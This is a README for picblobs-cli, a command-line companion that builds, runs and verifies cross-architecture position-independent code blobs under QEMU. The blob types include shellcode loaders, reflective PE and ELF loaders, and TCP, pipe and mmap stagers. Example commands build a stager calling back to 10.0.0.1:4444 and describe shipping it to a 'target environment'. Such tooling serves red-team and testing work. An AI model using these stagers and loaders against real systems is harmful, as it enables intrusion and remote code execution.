# picblobs-cli

`picblobs-cli` is a companion package that bundles the cross-compiled test
runners and verifier-only test binaries alongside a `click`-based
command-line interface. It depends on
[`picblobs`](https://pypi.org/project/picblobs/) for blob data and the
builder API. Install `picblobs-cli` when you want to build, run, or
verify blobs from the shell -- if all you need is the blob bytes, stick
with `picblobs` on its own.

See [ADR-026](../../spec/decisions/ADR-026-runner-tools-split-into-picblobs-cli.md)
and [REQ-020](../../spec/requirements/REQ-020-picblobs-cli.md) for the
architecture and full contract.

## Installation

```bash
pip install picblobs-cli      # pulls in picblobs + click, ships runners/fixtures
```

QEMU user-static must be on `PATH` for cross-architecture execution:

```bash
# Debian / Ubuntu
sudo apt install qemu-user-static

# Fedora / RHEL
sudo dnf install qemu-user-static
```

From a source checkout, `source sourceme` installs both packages in
editable mode.

## Commands

```
picblobs-cli --help
picblobs-cli COMMAND --help
```

### `info`

Print versions, the runner bundle directory, QEMU availability, and a
one-line summary of every staged target.

```bash
$ picblobs-cli info
picblobs:     0.1.0
picblobs-cli: 0.1.0
runner bundle: /.../picblobs_cli/_runners
qemu found:    aarch64, armv5_arm, ..., x86_64

Targets:
  freebsd:aarch64  (15 blob types)
  freebsd:armv5_arm  (15 blob types)
  ...
  windows:x86_64  (3 blob types)
```

### `list-runners`

List every bundled `(runner_type, arch)` runner binary.

```bash
picblobs-cli list-runners
picblobs-cli list-runners --os linux
picblobs-cli list-runners --arch x86_64
```

### `build`

Use the `picblobs.Blob(...)` builder API to assemble a ready-to-run
blob and write it as raw bytes.

```bash
# hello (no config)
picblobs-cli build hello linux:x86_64 -o hello.bin

# alloc_jump with an inner payload
picblobs-cli build alloc_jump linux:x86_64 \
    --payload inner_shellcode.bin \
    -o aj.bin

# stager_tcp with a target
picblobs-cli build stager_tcp linux:aarch64 \
    --address 10.0.0.1 \
    --port 4444 \
    -o stage.bin

# stager_pipe / stager_mmap
picblobs-cli build stager_pipe linux:x86_64 --path /tmp/my.fifo -o sp.bin
picblobs-cli build stager_mmap linux:x86_64 \
    --path /tmp/payload.img --offset 0 --size 4096 \
    -o sm.bin

# reflective_pe (Windows only)
picblobs-cli build reflective_pe windows:x86_64 \
    --pe image.dll --call-dll-main \
    -o refl.bin

# ul_exec — reflective ELF loader
picblobs-cli build ul_exec linux:x86_64 \
    --elf /usr/bin/ls --argv ls --argv -la \
    --envp PATH=/usr/bin \
    -o uex.bin
```

Options not applicable to the chosen blob type are rejected before any
bytes are written, with a hint listing the options that *are* valid.

### `run`

`run` has two modes:

#### Registry mode — look a blob up by type

```bash
picblobs-cli run hello linux:x86_64
picblobs-cli run hello linux:aarch64                # cross-arch via QEMU
picblobs-cli run alloc_jump linux:x86_64 --payload inner.bin
picblobs-cli run stager_fd linux:x86_64 --stdin payload_stream.bin
```

Options:

- `--config-hex HEX` — append the hex bytes as the config struct.
- `--payload FILE` — append the file contents as the config.
- `--stdin FILE` — feed file contents to the blob on fd 0.
- `--timeout SECONDS` (default 30).
- `--debug` — print command, paths, keep temp files.

#### File mode — execute an already-assembled blob

```bash
# Build once, run anywhere
picblobs-cli build alloc_jump linux:x86_64 --payload inner.bin -o aj.bin
picblobs-cli run --file aj.bin linux:x86_64

# Cross-architecture: target selects the runner + QEMU binary
picblobs-cli build stager_tcp linux:aarch64 \
    --address 127.0.0.1 --port 4444 -o stage.bin
picblobs-cli run --file stage.bin linux:aarch64

# Stdin still works; the file is handed to the runner as-is.
picblobs-cli run --file stage_fd.bin linux:x86_64 --stdin payload.bin
```

Because the file is assumed to be a complete (code + config) blob,
`--config-hex` and `--payload` are rejected in file mode — assemble the
blob first with `build`.

Passing both a positional `<blob_type>` and `--file` is a usage error:
the two modes are mutually exclusive. A missing target or missing file
is caught by click before execution.

### `verify`

Exercise every staged blob end-to-end with the appropriate fixtures
(TCP server, FIFO, temp file, stdin piping, inner-payload packing for
`alloc_jump`, staged `ul_exec` ELFs, paired NaCl handshake).

```bash
# full sweep
picblobs-cli verify

# filters
picblobs-cli verify --os linux
picblobs-cli verify --type hello
picblobs-cli verify --os freebsd --arch aarch64
```

Exits non-zero if any blob fails; prints a `PASSED / FAILED / SKIPPED`
summary listing the failing combinations by name.

## Typical workflows

### Iterating on a payload during development

```bash
# Edit src/payload/my_blob.c, then
./buildall

# Single-shot run
picblobs-cli run my_blob linux:x86_64

# Full sweep across every staged target
picblobs-cli verify --type my_blob
```

### Producing artifacts for an external system

```bash
# Generate the blob once
picblobs-cli build stager_tcp linux:aarch64 \
    --address 10.0.0.1 --port 4444 -o stage.bin

# Ship stage.bin to the target environment, or sanity-check it locally
picblobs-cli run --file stage.bin linux:aarch64 --timeout 5
```

### Scripting around the CLI

The exit code is the blob's exit code (or the CLI's own error code).
Stdout and stderr are passed through verbatim, so scripting idioms work:

```bash
if output=$(picblobs-cli run my_blob linux:x86_64); then
    echo "blob said: $output"
fi
```

## Relationship to `picblobs`

| Need                                  | Package        |
|---------------------------------------|----------------|
| Assemble blobs from the Python builder | `picblobs`     |
| Read blob metadata / config layouts   | `picblobs`     |
| Run / verify blobs under QEMU         | `picblobs-cli` |
| Get cross-compiled runner binaries    | `picblobs-cli` |

If you install only `picblobs`, `picblobs.runner.find_runner()` raises
`FileNotFoundError` with a message pointing at `picblobs-cli`. The
data library itself remains fully usable — it just can't execute.
